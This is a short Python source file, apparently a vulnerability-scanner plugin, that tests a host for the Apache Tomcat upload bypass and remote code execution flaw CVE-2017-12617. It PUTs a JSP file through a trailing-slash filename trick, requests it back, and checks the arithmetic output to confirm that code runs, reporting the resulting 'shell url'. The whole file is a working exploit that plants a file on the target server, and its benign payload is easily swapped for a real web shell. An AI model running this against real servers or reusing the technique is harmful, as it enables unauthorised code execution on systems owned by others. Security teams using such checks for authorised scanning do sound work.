# -*- coding:utf-8 -*-

import requests
import random
import string
import urllib.parse as urlparse


def random_str(length):
    pool = string.digits + string.ascii_lowercase
    return "".join(random.choice(pool) for _ in range(length))

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if Apache Tomcat Upload Bypass / Remote Code Execution(CVE-2017-12617) vul')
    result = ""
    payload = "<%out.println(1963*4);%>"
    filename = "{}.jsp".format(random_str(16))
    try:
        url = requests.get(url, verify=False,timeout=5).url
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    shell_url = urlparse.urljoin(url, filename)
    target_url = shell_url + "/"

    try:
        requests.put(target_url, payload, verify=False,timeout=5)

    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    else:
        try:
            resp = requests.get(shell_url, verify=False,timeout=5)

        except Exception as e:
            msg = "get shell url error : " + str(e) + '.'
            number = 'v0'
            return False,url,number,msg
        else:
            if "7852" in resp.text:
                msg = 'there is Apache Tomcat Upload Bypass / Remote Code Execution(CVE-2017-12617) vul on url: ' +url+ ', the shell url is : '+shell_url+' .'
                number = 'v53'
                return True,url,number,msg
            else:
                msg = 'there is no Apache Tomcat Upload Bypass / Remote Code Execution(CVE-2017-12617) vul on url: ' +url+ '.'
                number = 'v0'
                return False,url,number,msg


